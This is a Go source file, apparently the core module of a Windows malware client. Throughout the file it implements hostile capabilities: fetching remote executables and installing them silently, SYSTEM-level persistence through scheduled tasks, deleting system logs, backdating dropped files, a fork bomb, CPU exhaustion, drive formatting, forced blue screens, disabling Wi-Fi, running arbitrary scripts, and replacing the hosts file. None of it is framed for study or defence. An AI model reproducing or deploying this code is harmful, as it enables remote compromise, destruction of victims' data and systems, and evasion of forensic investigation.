package core

import (
	"fmt"
	"golang.org/x/sys/windows"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
	"unsafe"
)

func SetWallpaper(Image string) {
	_, _, _ = procSystemParametersInfoW.Call(20, 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(Image))), 2)
}

//TODO Fix this, Its not running correct
func ForkBomb() {
	for {
		time.Sleep(500 * time.Millisecond)
		Run(`start cmd.exe @cmd /k "color 0a && tree"`)
		time.Sleep(500 * time.Millisecond)
		Run(`start cmd.exe @cmd /k "color 0e && ipconfig"'`)
		time.Sleep(500 * time.Millisecond)
		Run(`start cmd.exe @cmd /k "color 0c && systeminfo"'`)
		time.Sleep(500 * time.Millisecond)
		Run(`start cmd.exe @cmd /k "color 0f && tasklist"'`)
		time.Sleep(500 * time.Millisecond)
		go ForkBomb()
	}
}

func CreatePersistentCommand(cmd string) {
	_ = IssuePowershell(fmt.Sprintf(`schtasks /create /tn "`+RandomString(15)+`" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
}

func CPULoader(cores int, interval string, percentage int) {
	runtime.GOMAXPROCS(cores)
	unitHundredsOfMicrosecond := 1000
	runMicrosecond := unitHundredsOfMicrosecond * percentage
	for i := 0; i < cores; i++ {
		go func() {
			runtime.LockOSThread()
			for {
				begin := time.Now()
				for {
					if time.Since(begin) > time.Duration(runMicrosecond)*time.Microsecond {
						break
					}
				}
			}
		}()
	}

	t, _ := time.ParseDuration(interval)
	time.Sleep(t * time.Second)
}

func SilentInstall(file string, m bool) bool {
	var suffix, command string
	n := RandomString(15)
	if m {
		suffix = "exe"
		command = os.Getenv("APPDATA") + "\\" + n + ".exe /q /norestart"
	} else {
		suffix = "msi"
		command = `msiexec /i /quiet /norestart "` + os.Getenv("APPDATA") + "\\" + n + ".msi" + `"`
	}
	output, err := os.Create(os.Getenv("APPDATA") + "\\" + n + "." + suffix)
	if err != nil {
		return false
	}
	defer output.Close()
	response, err := http.Get(file)
	if err != nil {
		return false
	}
	defer response.Body.Close()
	_, err = io.Copy(output, response.Body)
	if err != nil {
		return false
	}
	err = exec.Command("cmd", "/C", command).Run()
	if err != nil {
		return false
	}
	return true
}

func ClearSystemLogs() bool {
	err := os.Chdir("%windir%\\system32\\config")
	if err != nil {
		return false
	}
	err = exec.Command("cmd", "/C", "del *log /a /s /q /f").Run()
	if err != nil {
		return false
	}
	return true
}

func WiFiDisconnect() bool {
	err := exec.Command("cmd", "/C", `netsh interface set interface name="Wireless Network Connection" admin=DISABLED`).Run()
	if err != nil {
		return false
	}
	return true
}

func FormatDrive(drive string) bool {
	err := exec.Command("cmd", "/C", "format "+drive+": /fs:ntfs").Run()
	if err != nil {
		return false
	}
	return true
}

func Scripter(name, code string, m int) bool {
	var suffix string
	var command string
	if m == 0 {
		suffix = "ps1"
		command = "start powershell -noexit -ExecutionPolicy -File " + os.Getenv("APPDATA") + "\\" + name + "." + suffix
	} else if m == 1 {
		suffix = "vbs"
		command = os.Getenv("APPDATA") + "\\" + name + "." + suffix
	} else if m == 2 {
		suffix = "wsf"
		command = os.Getenv("APPDATA") + "\\" + name + "." + suffix
	} else if m == 3 {
		suffix = "js"
		command = os.Getenv("APPDATA") + "\\" + name + "." + suffix
	} else if m == 4 {
		suffix = "bat"
		command = os.Getenv("APPDATA") + "\\" + name + "." + suffix
	}
	n, _ := os.Create(os.Getenv("APPDATA") + "\\" + name + "." + suffix)
	_, err := n.WriteString(code)
	if err != nil {
		return false
	}
	_ = n.Close()
	time.Sleep(2 * time.Second)
	//fmt.Println("SCRIPT: ", IssuePowershell(command))
	_ = IssuePowershell(command)
	return true
}

func TriggerBSOD() {
	var bEnabled int8
	_, _, _ = procRtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(&bEnabled)))
	var uResp int32
	_, _, _ = procNtRaiseHardError.Call(0xC0000005, 0, 0, 0, 6, uintptr(unsafe.Pointer(&uResp)))
}

func DropFile(file, path, name, createdDate string) bool {
	output, _ := os.Create(path + name)
	defer output.Close()
	response, _ := http.Get(file)
	defer response.Body.Close()
	_, _ = io.Copy(output, response.Body)
	_ = IssuePowershell(`Set-ItemProperty -Path ` + path + name + ` -Name CreationTime -Value "` + createdDate + `"`)
	return CheckIfFileExists(path + name)
}

func EditHosts(hosts string) bool {
	err := os.Rename("C:\\Windows\\System32\\drivers\\etc\\hosts", "C:\\Windows\\System32\\drivers\\etc\\hosts.old")
	if err != nil {
		return false
	}
	hostFile, _ := os.Create("C:\\Windows\\System32\\drivers\\etc\\hosts")
	_, err = hostFile.WriteString(Base64Decode(hosts))
	if err != nil {
		return false
	}
	_ = hostFile.Close()
	return true
}
